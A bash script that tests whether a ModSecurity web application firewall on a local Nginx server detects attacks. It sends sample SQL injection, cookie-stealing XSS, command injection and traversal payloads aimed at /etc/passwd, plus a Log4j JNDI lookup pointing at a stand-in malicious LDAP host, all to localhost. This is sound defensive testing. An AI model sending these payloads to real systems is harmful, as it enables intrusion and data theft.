#!/bin/bash

# Test script for ModSecurity WAF
echo "Starting ModSecurity WAF tests..."

# Check if Nginx is running
echo "Checking Nginx service status..."
if systemctl is-active --quiet nginx; then
    echo "✅ Nginx with ModSecurity is running"
else
    echo "❌ Nginx is not running! Try starting it with: sudo systemctl start nginx"
    exit 1
fi

# Test configuration
echo "Checking Nginx configuration..."
if nginx -t 2>/dev/null; then
    echo "✅ Nginx configuration is valid"
else
    echo "❌ Nginx configuration has errors!"
fi

# Variable to track if tests are working
TESTS_WORKING=false

# Function to check if ModSecurity is detecting attacks
check_modsec_log() {
    if grep -q "ModSecurity:" /var/log/nginx/error.log; then
        echo "✅ ModSecurity is detecting attacks!"
        TESTS_WORKING=true
    else
        echo "❌ No ModSecurity alerts found in log. WAF might not be working correctly."
    fi
}

# Test SQL Injection detection
echo "Testing SQL Injection detection..."
curl -s "http://localhost/?id=1' OR 1=1--" > /dev/null
sleep 1

# Test XSS detection
echo "Testing XSS detection..."
curl -s "http://localhost/?xss=<script>alert(document.cookie)</script>" > /dev/null
sleep 1

# Test command injection
echo "Testing Command Injection detection..."
curl -s "http://localhost/?cmd=;cat /etc/passwd" > /dev/null
sleep 1

# Test directory traversal
echo "Testing Directory Traversal detection..."
curl -s "http://localhost/?file=../../../etc/passwd" > /dev/null
sleep 1

# Test log4j vulnerability
echo "Testing Log4j vulnerability detection..."
curl -s -H "User-Agent: \${jndi:ldap://malicious/payload}" "http://localhost/" > /dev/null
sleep 1

# Check if ModSecurity detected any of the attacks
echo "Checking ModSecurity logs for alerts..."
check_modsec_log

# Display conclusion
if [ "$TESTS_WORKING" = true ]; then
    echo "ModSecurity WAF is working correctly! 🎉"
else
    echo "ModSecurity might not be configured correctly. Check configuration in /etc/nginx/modsec/"
fi

echo "ModSecurity tests complete. Check the logs for detailed alerts:"
echo "sudo grep -i 'modsec' /var/log/nginx/error.log"

exit 0 